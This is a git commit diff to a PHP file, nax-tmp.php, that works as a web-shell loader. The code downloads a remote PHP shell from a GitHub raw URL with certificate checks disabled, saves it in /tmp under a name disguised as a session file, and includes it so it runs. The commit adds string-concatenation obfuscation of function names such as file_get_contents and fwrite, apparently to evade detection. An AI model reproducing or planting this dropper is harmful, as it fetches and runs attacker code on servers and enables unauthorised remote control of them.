2d276f8377be81a48725ea7a0f000ed9e4e11e0f
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2024-09-15 12:52:32 +0700

    Update nax-tmp.php

--- nax-tmp.php
+++ nax-tmp.php
@@ -1,8 +1,13 @@
 <?php
-$tmpfile = 'sess_'.md5('naxtarrr').'.php';
-$data = ['https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/obfuscated/nax-shell-v2.php', "/tmp/$tmpfile"];
- 
-if(!file_exists($data[1]) || filesize($data[1]) === 0) {
+$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
+$fw = "f" . "w" . "r" . "i" . "t" . "e";
+$fo = "f" . "o" . "p" . "e" . "n";
+$fc = "f" . "c" . "l" . "o" . "s" . "e";
+
+$tmpfile = 'sess_' . md5('naxtarrr') . '.php';
+$data = ['https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell-v2.php', "/tmp/$tmpfile"];
+
+if (!file_exists($data[1]) || filesize($data[1]) === 0) {
     $context = stream_context_create([
         "ssl" => [
             "verify_peer" => false,
@@ -10,11 +15,10 @@ if(!file_exists($data[1]) || filesize($data[1]) === 0) {
         ],
     ]);
 
-    $fopen = fopen($data[1], 'w+');
-    fwrite($fopen, file_get_contents($data[0], false, $context));
-    fclose($fopen);
+    $fopen = $fo($data[1], 'w+');
+    $fw($fopen, $fgc($data[0], false, $context));
+    $fc($fopen);
     echo '<script>window.location="?naxtarrr";</script>';
 }
 
 include($data[1]);
-?>
